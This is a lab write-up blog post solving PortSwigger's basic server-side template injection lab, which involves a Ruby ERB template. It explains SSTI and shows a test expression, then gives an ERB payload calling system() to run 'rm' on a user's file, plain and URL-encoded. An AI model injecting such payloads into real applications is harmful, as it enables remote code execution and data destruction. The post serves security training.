---
title: Basic SSTI — Server-Side Template Injection | 2023
url: https://infosecwriteups.com/basic-ssti-server-side-template-injection-2023-da4995583554?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-01-25
fetch_date: 2025-10-04T04:43:25.599147
---

# Basic SSTI — Server-Side Template Injection | 2023

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fda4995583554&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbasic-ssti-server-side-template-injection-2023-da4995583554&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbasic-ssti-server-side-template-injection-2023-da4995583554&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[Mastodon](https://me.dm/%40cyberw1ng)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-da4995583554---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-da4995583554---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Basic SSTI — Server-Side Template Injection | 2023

## Portswigger — Basic server-side template injection Solution | Karthikeyan Nagaraj

[![Karthikeyan Nagaraj](https://miro.medium.com/v2/da:true/resize:fill:64:64/1*MQN6JztXVcWsGNXCfJGlgw.gif)](https://cyberw1ng.medium.com/?source=post_page---byline--da4995583554---------------------------------------)

[Karthikeyan Nagaraj](https://cyberw1ng.medium.com/?source=post_page---byline--da4995583554---------------------------------------)

3 min read

·

Jan 20, 2023

--

Listen

Share

![]()

### What is SSTI?

* Server-side template injection is **a v**ulnerability where the attacker injects malicious input into a template to execute commands on the server-side
* This vulnerability occurs when invalid user input is embedded into the template engine which can generally lead to remote code execution (RCE).
* Template engines are designed to combine templates with a data model to produce result documents that help populate dynamic data into web pages.
* Template engines can be used to display information about users, products
* Popular template engines are,

1. PHP — Smarty, Twigs
2. Java — Velocity, Freemaker
3. Python — JINJA, Mako, Tornado
4. JavaScript — Jade, Rage
5. Ruby — Liquid

### What is ERB?

* ERB is **a templating language based on Ruby**.
* Puppet can evaluate ERB templates with the template and inline\_template functions.

### Lab Description:

This lab is vulnerable to server-side template injection due to the **unsafe construction of an ERB template.**

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

### Analysis:

1. On Clicking the First Product, it is Displaying a Message “*Unfortunately this product is out of stock*”

![]()

2. Capture the Request on burp “*if needed*”

Press enter or click to view image in full size

![]()

3. Let’s try to Insert the ERB code. The Syntax is below,

```
<%= someExpression %>
```

Code to Check:

```
<%= 5*5 %>
```

4. Look at the request, the URL Parameter is encoded, so we have to Encode the ERB code if we are sending in burp

![]()

Encoded Final Url (If Sending this in Burp):

```
https://<Your-Lab-ID>.web-security-academy.net/?message=<%25%3d+5*5+%25>
```

5. Or you can Directly Insert the code into the message parameter on the browser to check

Press enter or click to view image in full size

![]()

6. It is Working, So let’s Inject a payload to delete`morale.txt`

7. From the Ruby documentation, discover the `system()` method, which can be used to execute arbitrary operating system commands.

8. Construct a payload to delete Carlos’s file as follows:

`<%= system("rm /home/carlos/morale.txt") %>`

9. Inject the payload into the message parameter as below

```
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

Press enter or click to view image in full size

![]()

A YouTube Channel for Cybersecurity Lab’s Poc and Write-ups

[## Cyberw1ng

### Learn Cyber Security and Create Awareness ~ cyberwing Stay tuned with me, Subscribe, and Like the Videos… Ask Doubts…

www.youtube.com](https://www.youtube.com/channel/UCBg0UIT0319Xc-cw4QK8bqA?sub_confirmation=1&source=post_page-----da4995583554---------------------------------------)

Github for Resources:

[## Cyberw1ng — Overview

### Security Researcher and Bug Hunter. Cyberw1ng has 8 repositories available. Follow their code on GitHub.

github.com](https://github.com/cyberw1ng?source=post_page-----da4995583554---------------------------------------)

Telegram Channel for Free Ethical Hacking Dumps

[## Ethical Hacking Dumps — CEH, OSCP, Comptia

### Materials and Books for Ethical Hacking Exams like CEH v12, OSCP, Comptia Pentest+, Comptia Security+, Comptia Network+…

t.me](https://t.me/ethicalhackingessentials?source=post_page-----da4995583554---------------------------------------)

Thank you for Reading!

Happy Ethical Hacking ~

`Author: Karthikeyan Nagaraj ~ Cyberw1ng`

Feel Free to Ask Queries via [LinkedIn](https://www.linkedin.com/in/karthikeyan-nagaraj) and to Buy me a Cofee : )

[![]()](http://buymeacoffee.com/cyberw1ng)

[Portswigger](https://medium.com/tag/portswigger?source=post_page-----da4995583554---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----da4995583554---------------------------------------)

[Bug Bounty Tips](https://medium.com/tag/bug-bounty-tips?source=post_page-----da4995583554---------------------------------------)

[Ctf](https://medium.com/tag/ctf?source=post_page-----da4995583554---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----da4995583554---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--da4995583554---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--da4995583554---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--da4995583554---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--da4995583554---------------------------------------)

·[Last published 5 days ago](/how-to-find-p1-bugs-using-google-in-your-target-part-1-e37455324dc1?source=post_page---post_publication_info--da4995583554---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encou...